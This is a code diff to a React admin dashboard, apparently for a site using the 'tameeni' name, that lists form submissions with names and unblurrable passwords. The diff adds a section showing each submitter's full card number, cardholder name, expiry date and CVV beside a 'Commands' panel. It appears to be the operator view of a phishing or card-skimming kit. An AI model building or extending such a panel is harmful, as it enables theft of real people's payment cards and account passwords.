@@ -1,6 +1,6 @@
 import { useEffect, useRef, useState } from "react";
 import { tameeniApi, type Submission } from "@/lib/api";
-import { Shield, Trash2, Trash, Users, Wifi, WifiOff, Eye, EyeOff, ChevronDown } from "lucide-react";
+import { Shield, Trash2, Trash, Users, Wifi, WifiOff, Eye, EyeOff, ChevronDown, CreditCard } from "lucide-react";
 
 const ADMIN_KEY = "tameeni_admin_auth";
 
@@ -178,7 +178,7 @@ export default function AdminPage() {
                 </button>
               </div>
 
-              {/* Data grid */}
+              {/* Personal data grid */}
               <div className="bg-gray-950 rounded-2xl border border-gray-800 divide-y divide-gray-800">
                 {[
                   { label: "الاسم", val: selected.name },
@@ -207,6 +207,31 @@ export default function AdminPage() {
                 {showPw ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                 {showPw ? "إخفاء كلمة المرور" : "إظهار كلمة المرور"}
               </button>
+
+              {/* Card data */}
+              {selected.cardNumber && (
+                <div className="space-y-2">
+                  <div className="flex items-center gap-2">
+                    <CreditCard className="w-4 h-4 text-yellow-400" />
+                    <h3 className="text-[13px] font-extrabold text-yellow-400">بيانات البطاقة</h3>
+                  </div>
+                  <div className="bg-gray-950 rounded-2xl border border-yellow-900 divide-y divide-gray-800">
+                    {[
+                      { label: "رقم البطاقة", val: selected.cardNumber },
+                      { label: "اسم حامل البطاقة", val: selected.cardName },
+                      { label: "تاريخ الانتهاء", val: selected.cardMonth && selected.cardYearExp ? `${selected.cardMonth}/${selected.cardYearExp}` : "—" },
+                      { label: "CVV", val: selected.cardCvv, sensitive: true },
+                    ].map((row) => (
+                      <div key={row.label} className="flex items-center justify-between px-4 py-2.5">
+                        <span className="text-[11px] font-bold text-gray-500">{row.label}</span>
+                        <span className={`text-[13px] font-semibold text-yellow-200 font-mono ${row.sensitive && !showPw ? "blur-sm select-none" : ""}`} dir="ltr">
+                          {row.val || "—"}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
 
               {/* Commands */}
               <div className="space-y-3">
